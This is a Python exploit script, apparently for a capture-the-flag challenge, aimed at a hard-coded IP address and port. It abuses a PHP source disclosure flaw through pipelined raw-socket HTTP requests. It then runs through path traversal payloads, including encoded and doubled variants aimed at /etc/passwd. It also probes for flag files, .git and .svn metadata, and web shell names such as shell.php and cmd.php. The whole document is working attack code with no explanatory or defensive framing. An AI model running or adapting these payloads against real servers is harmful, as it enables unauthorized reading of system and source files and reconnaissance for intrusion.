#!/usr/bin/env python3
import socket
import requests

def exploit_source_disclosure(host, port, target_file):
    """
    Exploit the PHP source disclosure vulnerability.
    """
    payload = (
        f"GET /{target_file} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
        f"GET /xyz.xyz HTTP/1.1\r\n"
        f"\r\n"
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(payload.encode())
        
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='replace')
    except Exception as e:
        return f"Error: {e}"

host = "61.147.171.35"
port = 51810

# Let's try path traversal to read other files
files = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "flag.php",
    "flag.txt",
    ".flag.php",
    ".htaccess",
    "../flag.txt",
    "../flag.php",
    "../index.php",
    "secret.php",
    "getflag.php",
    "admin.php",
    "shell.php",
    "cmd.php",
    "webshell.php",
]

print("[*] Scanning for files using source disclosure vulnerability...")
print()

for f in files:
    result = exploit_source_disclosure(host, port, f)
    if '404 Not Found' not in result and 'Error:' not in result:
        # Check if we got actual content
        if 'Content-Length: 0' not in result:
            print(f"[+] {f}:")
            # Extract body
            if "\r\n\r\n" in result:
                body = result.split("\r\n\r\n", 1)[1]
                if body.strip():
                    print(body[:500])
                    print("-" * 50)

# Also try direct access to non-PHP files
print("\n[*] Trying direct file access...")
non_php_files = [
    "flag.txt",
    ".flag",
    "secret.txt",
    "readme.txt",
    "flag",
    ".git/config",
    ".svn/entries",
    "robots.txt",
]

for f in non_php_files:
    try:
        r = requests.get(f"http://{host}:{port}/{f}", timeout=5)
        if r.status_code == 200 and "Not Found" not in r.text:
            print(f"[+] Direct: {f}")
            print(r.text[:500])
            print("-" * 50)
    except:
        pass
